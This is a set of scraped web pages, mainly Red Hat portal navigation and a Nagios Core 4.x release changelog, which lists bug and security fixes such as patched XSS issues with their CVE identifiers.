[What’s Included](https://www.nagios.org/whats-included-in-nagios-csp)

[Switch From Nagios Core](https://www.nagios.org/switch)

##### [About](https://www.nagios.org/about/)

[The Nagios Project](https://www.nagios.org/projects/)

[The Nagios Story](https://www.nagios.org/story/)

[The Nagios Team](https://www.nagios.org/team/)

##### [Solutions](https://www.nagios.com/solutions/)

[Why Nagios Is Best](https://www.nagios.org/why-nagios/)

[Nagios Alternatives](https://www.nagios.org/alternative/)

[Extending Nagios](https://www.nagios.org/extend/)

##### [Community](https://www.nagios.org/about/community/)

[Bounty Program](https://www.nagios.org/bounty/)

[Nagios MVPs](https://www.nagios.org/mvp/)

[Nagios Addons](https://www.nagios.org/mvp/)

[Nagios Conference](https://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=footer)

**Nagios Provides Complete Monitoring Of:** [Windows](https://www.nagios.com/solutions/windows-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Linux](https://www.nagios.com/solutions/linux-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [UNIX](https://www.nagios.com/solutions/unix-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Servers](https://www.nagios.com/solutions/server-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Websites](https://www.nagios.com/solutions/website-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [SNMP](https://www.nagios.com/solutions/snmp-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [DHCP](https://www.nagios.com/solutions/dhcp-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [DNS](https://www.nagios.com/solutions/dns-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Email](https://www.nagios.com/solutions/email-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Storage](https://www.nagios.com/solutions/storage-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Files](https://www.nagios.com/solutions/file-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [Apache](https://www.nagios.com/solutions/apache-log-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [IIS](https://www.nagios.com/solutions/iis-log-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), [EC2](https://www.nagios.com/solutions/amazon-ec2-monitoring/?utm_campaign=solutions&utm_source=org&utm_medium=footer), and [more](https://www.nagios.com/solutions/?utm_campaign=solutions&utm_source=org&utm_medium=footer)!

Nagios, the Nagios logo, and Nagios graphics are the servicemarks, trademarks, or registered trademarks owned by Nagios Enterprises. All other servicemarks and trademarks are the property of their respective owner. Website Copyright © 2009-currentYear Nagios Enterprises, LLC. All rights reserved.



=== Content from www.redhat.com_beeab55c_20250126_033725.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from twitter.com_e3041705_20250126_033744.html ===



=== Content from www.redhat.com_cc794d9c_20250126_033722.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.nagios.org_0f9b37b7_20250126_033727.html ===


[Skip to content](#content)
[![](https://www.nagios.org/wp-content/uploads/2024/10/nagios-white-2.png)](https://www.nagios.org/launch)

[![](https://www.nagios.org/wp-content/uploads/2024/10/Nagios-N-White.png)](https://www.nagios.org/launch)

[Download](https://go.nagios.org/get-csp-zip)

* [Forum](https://www.nagios.org/community/)
* [FAQ](https://www.nagios.org/faq/)
* [Upgrade](https://www.nagios.org/upgrade/)
* [Projects](https://www.nagios.org/projects/)
  + [Nagios Core](https://www.nagios.org/projects/nagios-core/)
  + [Nagios Plugins](https://www.nagios.org/downloads/nagios-plugins/)
  + [Nagios Gearman](https://www.nagios.org/projects/nagios-mod-gearman/)
  + [Nagios Addons](https://www.nagios.org/downloads/nagios-core-addons/)
* [Team](https://www.nagios.org/team/)
* [Conference](http://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=headermenu)
* [The Nagios Story](https://www.nagios.org/story/)

* [Forum](https://www.nagios.org/community/)
* [FAQ](https://www.nagios.org/faq/)
* [Upgrade](https://www.nagios.org/upgrade/)
* [Projects](https://www.nagios.org/projects/)
  + [Nagios Core](https://www.nagios.org/projects/nagios-core/)
  + [Nagios Plugins](https://www.nagios.org/downloads/nagios-plugins/)
  + [Nagios Gearman](https://www.nagios.org/projects/nagios-mod-gearman/)
  + [Nagios Addons](https://www.nagios.org/downloads/nagios-core-addons/)
* [Team](https://www.nagios.org/team/)
* [Conference](http://www.nagios.com/conference/?utm_campaign=nwc2025&utm_source=org&utm_medium=headermenu)
* [The Nagios Story](https://www.nagios.org/story/)

Search

# Nagios Core 4.x Version History

## 4.5.9 - 2024-12-19

### Fixes

* Fix unreachable notifications (Dylan Anderson)
* Add light option in new exfoliation theme (Dylan Anderson)
* Fix authentication in trends.cgi (Dylan Anderson)

## 4.5.8 - 2024-11-19

### Fixes

* Improve new exfoliation theme and add back in PID information (Dylan Anderson)
* Fix issues with downtimes that are both flexible and triggered and improve downtime additions in general (#595) (Dylan Anderson)

## 4.5.7 - 2024-10-24

### Fixes

* Expand the custom variable macros to an empty string, if the custom variable does not exist (Andre Klärner)
* Fix notification logic to not send a notification if a host and services parents are down (#873) (Dylan Anderson)
* Update Exfoliation theme (Dylan Anderson)

## 4.5.6 - 2024-10-08

### Fixes

* Send a recovery notification if the object recovered while flapping (#847) (Dylan Anderson)
* Fix for separate build directory & a couple small cleanups (Doug Nazar)
* Update tutorial links in Readme (Igor Udot)

## 4.5.5 - 2024-09-17

### Fixes

* Update configure scripts using newer versions of autotools (Dylan Anderson)
* Disable maintainer mode for TAP testing and add Github Actions (Dylan Anderson)

## 4.5.4 - 2024-08-14

### Fixes

* Fix inconsistent links for ‘View {Trends,Alert Histogram} For This {Host,Service}’ (Mauricio Faria de Oliveira)
* Fix broken links from removing AngularJS pages in 4.5.3 (Dylan Anderson)

## 4.5.3 - 2024-06-11

### Fixes

* Update jQuery (#960) (Dylan Anderson)
* Remove pages using outdated AngularJS framework (#960) (Dylan Anderson)
* Fix html encoding of some ascii characters (#813) (Dylan Anderson)
* Updated several page links to use ‘nofollow’ (#965) – (Griffin Westerman)

## 4.5.2 - 2024-04-30

### Fixes

* Fix handling of timeperiods w/ downtime availability calculations in the Availability CGI report (Sebastian Wolf)
* Fix build when compiling against musl libc (#952) (Sebastian Wolf)
* Fix downtime comment using current time instead of the downtime’s entry time (#910) (Dylan Anderson)

## 4.5.1 - 2024-02-28

### Fixes

* Fix text rendering in Configuration -> Command Expansion when the command ends in whitespace (Thanks Joran LEREEC for reporting this issue)

## 4.5.0 - 2023-11-16

Note: this release is backward-compatible, but does include updates to the header files.
If you are using any NEB modules in your monitoring solution, you will need to recompile them to avoid segmentation faults.

### Enhancements

* Add event\_handler\_period configuration option to hosts and services (#913)
* Add external commands CHANGE\_HOST\_EVENT\_HANDLER\_TIMEPERIOD and CHANGE\_SVC\_EVENT\_HANDLER\_TIMEPERIOD (#913)
* Added support for separating your build directory from your source directory (#867)

## 4.4.14 - 2023-08-01

### Fixes

* Fix missing macros when running performance data commands (#904)

## 4.4.13 - 2023-06-01

### Fixes

* Fix broken logo images in status pages (regression from 4.4.12) (#917)

## 4.4.12 – 2023-05-30

### Fixes

* Clean up most compiler warnings on GCC and clang (#901)
* Fix incorrect HTML entity escaping in CGIs (#907, #902)
* Fix issue where predictive dependency checks were not being scheduled for services (#908)
* Fix several typos (#898, #884)

## 4.4.11 – 2023-04-14

### Fixes

* Fix incorrect error message in preflight check (#865)
* Fix user-after-free in qh\_deregister\_handler (#866)
* Fix memory leak in qh\_deregister\_handler (#866)
* Fix mismatched host/service behavior when changing from SOFT to HARD state (#891)
* Improve performance in CGI utility functions (#866)

## 4.4.10 – 2023-01-17

### Fixes

* Fixed memory leak in nagiostats.c when using -c, -s, -d, or -D multiple times (#888)
* Improve service scheduling at startup (#887)
* Improve compilation/reduce warnings when using Clang 16 (#889)
* Improve compilation on other, stricter C99 compilers (#890)

## 4.4.9 – 2022-11-16

### Fixes

* Fixed check\_attempts remaining high during a HARD service recovery (#837)
* Fixed memory leak in NERD (#872)

## 4.4.8 – 2022-10-04

### Fixes

* Minor interface updates
* Fixed crash when checking for updates using SSL

## 4.4.7 – 2022-04-14

### Fixes

* Fixed checkboxes in jsonquery.html (#778) (Rfferrao87)
* Added SSL support for version update check (Sebastian Wolf)
* Note: NEB modules using the priority/scheduling queues in libnagios may need to update headers due to symbol conflicts with OpenSSL.
* Fixed XSS in homepage when displaying update check results (Sebastian Wolf)
* Fixed allocation error in getcgi.c (#820) (Ariadne Conill)
* Fixed Error: NULL variable for lines of spaces in resource.cfg (#814) (Ralf Herrmann)
* Fixed crash when handling large check output (#825, #828) (Kilvador)
* Update packaging instructions for RPM/EPEL (#850) (T.J. Yang)
* Include packaging instructions for DEB (#842) (Catfriend1)
* Fixed CGI object processing when names end in \ (#819) (Sebastian Wolf)
* $SERVICEPROBLEMID$ now accessible when notifications are sent (#688) (Sebastian Wolf)

## 4.4.6 – 2020-04-28

### Fixes

* Fixed Map display in Internet Explorer 11 (#714) (Scott Wilkerson)
* Fixed duplicate properties appearing in statusjson.cgi (#718) (Sebastian Wolf)
* Fixed NERD not building when enabled in ./configure (#723) (Sebastian Wolf)
* Fixed build process when using GCC 10 (#721) (Michael Orlitzky)
* Fixed postauth vulnerabilities in histogram.js, map.js, trends.js (CVE-2020-1408) (Thanks UraSec Team) (Sebastian Wolf)
* When using systemd, configuration will be verified before reloading (#715) (tatref)
* Fixed HARD OK states triggering on the maximum check attempt (#757) (Sebastian Wolf)

## 4.4.5 – 2019-08-20

### Fixes

* Reverted changes related to #625 due to CPU load issues
* Partially reverted changes for #647 due to CPU load issues
* Fixed “Quick Search” so that leading/trailing whitespace doesn’t affect output (#681) (Sebastian Wolf)
* Fixed build issues on non-RPM-based platforms (#617) (T.J. Yang)

## 4.4.4 – 2019-07-29

### Fixes

* Fixed log rotation logic to not repeatedly schedule rotation on a DST change (#610, #626)
* Fixed $SERVICEPROBLEMID$ to be reset after service recovery (#621)
* Fixed defunct worker processes appearing after nagios was reloaded (#441, #620)
* Fixed main nagios thread to release nagios.qh on a closed connection (#635)
* Fixed semicolon escaping to remove prepended backslash (\) (#643)
* Fixed ‘Checks of this host have been disabled’ message showing on passive-only hosts (#632)
* Fixed last\_hard\_state showing the current hard state when service status is brokered (#633)
* Fixed long plugin output (>8KB) occasionally getting truncated (#625)
* Fixed check scheduling for objects with large check\_intervals and small timeperiods (#647)
* Fixed SOFT recoveries sending when services had HARD recovery some time after host recovery (#651)
* Fixed incorrect permissions on debugging builds of FreeBSD (#420)
* Fixed NEB callback lists being partially orphaned when multiple modules subscribe to one callback (#590)
* Fixed memory leaks in run\_async\_service\_check(), run\_async\_host\_check() when checks are brokered (#664)
* Fixed potential XSS in main.php, map.php (#671, #672)
* Removed NEB brokering for nagios daemonization, since daemonization occurs before NEB initialization (#591)

## 4.4.3 – 2019-01-15

### Fixes

* Fixed services sending recovery emails when they recover if host in down state (#572)
* Fixed a make error when building on the aarch64 architecture (#598)
* Fixed –with-cgibindir and –with-webdir to actually set values given (#585)
* Fixed soft recovery states for services (#575)
* Fixed XSS vulnerability in Alert Summary report (CVE-2018-18245)
* Fixed services in soft states sometimes not switching into hard states (#576)
* Fixed last\_state\_change to update when a state goes from soft -> hard state (#592)
* Fixed Map link always being set to undefined host and don’t show link for Nagios Process root note (#539)
* Fixed notifications sending when services went into hard state on a down or unreachable host (#584)
* Fixed log\_host\_retries not logging the host soft state checks (#599)
* Fixed stalking\_options N option to properly log only when a notification is actually sent (#604)
* Fixed issue with service status totals being zero when servicegroup=all on servicegroup status page (#579)
* Fixed escalation notifications logic and recovery notifications not going out (#582)
* Fixed not finding child index causing duplicate hosts showing in the Map (#471)
* Fixed Map configuration popup checkboxes not working and Root Node not populating (#543)
* Fixed cleanup and deinit of neb modules on reload (#573)

## 4.4.2 – 2018-08-16

### Fixes

